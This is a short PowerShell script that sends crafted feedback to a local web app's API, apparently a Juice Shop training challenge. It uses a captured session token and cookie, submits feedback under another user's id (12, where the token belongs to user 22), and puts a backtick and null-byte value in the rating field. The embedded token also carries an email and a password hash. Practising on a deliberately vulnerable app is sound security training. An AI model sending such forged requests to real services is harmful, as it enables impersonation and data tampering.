$url = 'http://localhost:3000/api/Feedbacks/'
$headers = @{
    'Authorization' = 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJub2JvZHlAbm9ib2R5LmNvbSIsInBhc3N3b3JkIjoiNWZhZWJiZGY1MzkyNjIwYTE4MDg2ZGU4ZmEzYjE3NWUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoidW5kZWZpbmVkIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDgtMTIgMDI6MTc6NDUuNTczICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDgtMTIgMTM6NDk6MjkuMTc5ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY5MTg0ODkwN30.KI1QYqFltvQdVi2egqbVxkHjEEKzw5NWgnou7Df2AljrmG2OuVnJOlREdgzt2sEsQW4daWj9yijfHTm4enqhFo3dtvMsi1kZr4SeBNDL5X8HDAdIN9LNKJYgOqQYfqZYgyEv14gAxxblxWdImxi3jzX1YNmztqJs2036ajaUxgQ'
    'Cookie' = 'language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=pNX5v7ZRWx6Yzegwmo80a1hoteUzHWC7fWNUMgFwV0BOKbyP1ankJV9jrMDQ; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJub2JvZHlAbm9ib2R5LmNvbSIsInBhc3N3b3JkIjoiNWZhZWJiZGY1MzkyNjIwYTE4MDg2ZGU4ZmEzYjE3NWUiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoidW5kZWZpbmVkIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDgtMTIgMDI6MTc6NDUuNTczICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDgtMTIgMTM6NDk6MjkuMTc5ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY5MTg0ODkwN30.KI1QYqFltvQdVi2egqbVxkHjEEKzw5NWgnou7Df2AljrmG2OuVnJOlREdgzt2sEsQW4daWj9yijfHTm4enqhFo3dtvMsi1kZr4SeBNDL5X8HDAdIN9LNKJYgOqQYfqZYgyEv14gAxxblxWdImxi3jzX1YNmztqJs2036ajaUxgQ'
}
# 1..10 | ForEach-Object {

    $rating = '` %00'
    $payload = @{
        'captcha'="22"
        'captchaId'=0
        'comment'="R $rating"
        'rating' = $rating
        'UserId' = 12
    }
    $feedbackResponse = Invoke-RestMethod -Method Post -Uri $url -Headers $headers -Body $payload
    $feedbackResponse.data | Select-Object -Property id, rating, comment
# }